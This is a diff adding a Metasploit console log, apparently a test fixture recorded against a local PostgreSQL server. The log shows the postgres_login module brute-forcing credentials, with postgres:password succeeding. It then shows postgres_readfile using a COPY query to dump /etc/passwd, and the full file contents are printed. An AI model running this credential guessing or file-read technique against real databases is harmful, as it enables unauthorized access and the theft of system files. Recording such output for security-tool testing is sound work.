@@ -1,0 +1,80 @@
+use auxiliary/scanner/postgres/postgres_login
+Stopping all jobs...
+[4mmsf6[0m auxiliary([1m[31madmin/postgres/postgres_readfile[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_login[0m) [0m> run PASS_FILE= USER_FILE= CreateSession=true username=postgres password=password rhost=127.0.0.1 rport=5432
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_login[0m) [0m> [!] No active DB -- Credential data will not be saved!
+[+] 127.0.0.1:5432 - Login Successful: postgres:password@template1
+[*] PostgreSQL session 1 opened (127.0.0.1:42247 -> 127.0.0.1:5432) at 2024-06-20 08:39:56 +0000
+use auxiliary/admin/postgres/postgres_readfile
+[-] 127.0.0.1:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
+[-] 127.0.0.1:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Bruteforce completed, 1 credential was successful.
+[*] 1 Postgres session was opened successfully.
+[*] Auxiliary module execution completed
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_login[0m) [0m> run session=1 Verbose=true
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[4mmsf6[0m auxiliary([1m[31madmin/postgres/postgres_readfile[0m) [0m> [*] 127.0.0.1:5432 Postgres - querying with 'select has_database_privilege(current_user,current_database(),'TEMP')'
+[*] 127.0.0.1:5432 Postgres - querying with 'CREATE TEMP TABLE OMRbqNZgZT (INPUT TEXT);
+      COPY OMRbqNZgZT FROM '/etc/passwd';
+      SELECT * FROM OMRbqNZgZT'
+[*] 127.0.0.1:5432 Rows Returned: 21
+Query Text: 'CREATE TEMP TABLE OMRbqNZgZT (INPUT TEXT);
+      COPY OMRbqNZgZT FROM '/etc/passwd';
+      SELECT * FROM OMRbqNZgZT'
+=================================================================================================================================
+
+    input
+    -----
+    Debian-exim:x:101:101::/var/spool/exim4:/bin/false
+    _apt:x:100:65534::/nonexistent:/bin/false
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+    postgres:x:999:999::/var/lib/postgresql:/bin/bash
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    root:x:0:0:root:/root:/bin/bash
+    sync:x:4:65534:sync:/bin:/bin/sync
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+postgres:x:999:999::/var/lib/postgresql:/bin/bash
+Debian-exim:x:101:101::/var/spool/exim4:/bin/false
+[+] 127.0.0.1:5432 Postgres - /etc/passwd saved in /home/runner/.msf4/loot/20240620083956_default_127.0.0.1_postgres.file_339201.txt
+[+] 127.0.0.1:5432 Postgres - Command complete.
+[*] Auxiliary module execution completed
+sessions -K
+[4mmsf6[0m auxiliary([1m[31madmin/postgres/postgres_readfile[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - PostgreSQL session 1 closed.
+[4mmsf6[0m auxiliary([1m[31madmin/postgres/postgres_readfile[0m) [0m> 
